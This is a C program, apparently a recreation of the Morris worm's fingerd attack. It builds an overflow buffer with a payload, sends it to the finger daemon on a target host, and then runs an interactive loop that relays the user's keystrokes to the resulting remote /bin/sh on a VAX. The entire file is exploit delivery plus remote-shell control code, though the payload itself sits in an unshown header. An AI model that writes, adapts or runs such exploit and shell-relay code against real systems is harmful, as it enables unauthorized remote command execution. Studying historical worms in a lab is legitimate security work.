#include "worm.h"

int main() {
    int sock = 0;
    struct sockaddr_in serv_addr;

    char buf[532] = {0};

	create_exploit(buf, PAYLOAD, (ssize_t)BUF_SIZE, (ssize_t)PAYLOAD_LEN);

	//create socket
	sock = socket(AF_INET, SOCK_STREAM, 0);
	create_sockaddr(&serv_addr, TARGET_IP, FINGERD_PORT);

	// connect to fingerd
	connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

	// deliever payload; fingerd should now be a shell
	write(sock, buf, sizeof(buf));
    printf("Payload delivered! Switching to interactive mode...\n");

    fd_set fds;
    char io_buf[1024];
    int n;

    while (1) {
        FD_ZERO(&fds);
        FD_SET(0, &fds);    // Watch stdin (your keyboard)
        FD_SET(sock, &fds); // Watch the socket (the VAX shell)

        // select() blocks until there is something to read from either source
		// select is destructive; it modifies the fds, removing all but one fd that is ready
		// to read; so you have to generate new fd_set every loop
        if (select(sock + 1, &fds, NULL, NULL, NULL) < 0) {
            perror("select");
            break;
        }

        // Check if the VAX sent us output (Shell results)
        if (FD_ISSET(sock, &fds)) {
            n = read(sock, io_buf, sizeof(io_buf));
            if (n <= 0) {
                printf("\n[-] Connection closed.\n");
                break;
            }
            write(1, io_buf, n); // Print results to your screen
        }

        // Check if you typed a command to send to the VAX
        if (FD_ISSET(0, &fds)) {
            n = read(0, io_buf, sizeof(io_buf));
            if (n > 0) {
                write(sock, io_buf, n); // Send command to /bin/sh
            }
        }
    }

	close(sock);

    return 0;
}
